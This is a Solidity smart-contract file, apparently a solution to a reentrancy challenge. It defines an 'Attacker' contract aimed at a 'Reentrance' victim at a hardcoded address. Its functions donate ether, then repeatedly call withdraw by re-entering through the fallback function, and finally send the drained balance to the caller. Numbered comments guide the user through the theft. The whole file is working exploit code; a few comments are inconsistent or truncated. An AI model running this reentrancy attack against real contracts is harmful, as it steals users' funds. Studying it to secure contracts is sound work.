// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./reentrency.sol";
import "hardhat/console.sol";

contract Attacker{
    Reentrance victimContract; //Contractname contractvariable

    address payable victimAddress = 0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99; 

    // // // import a contract
    constructor() public {
        victimContract = Reentrance(victimAddress);
    }

     // Call this function first
    function donateToVictim() public payable {
        victimContract.donate{value: msg.value}(address(this));// Send a transaction with .002 eth
    }

    // call this funciton second
    function attack() public {
       if (address(victimContract).balance >= .002 ether){ // when this is called the contract should have .003 eth
        victimContract.withdraw(.001 ether); // withdraws the fi
        }
    }
   
    // call this funciton to claim all the money drained
    function withdrawToCaller() public {
        msg.sender.call{value: address(this).balance}("");
    }

     fallback() external payable {
       attack();
    }

}
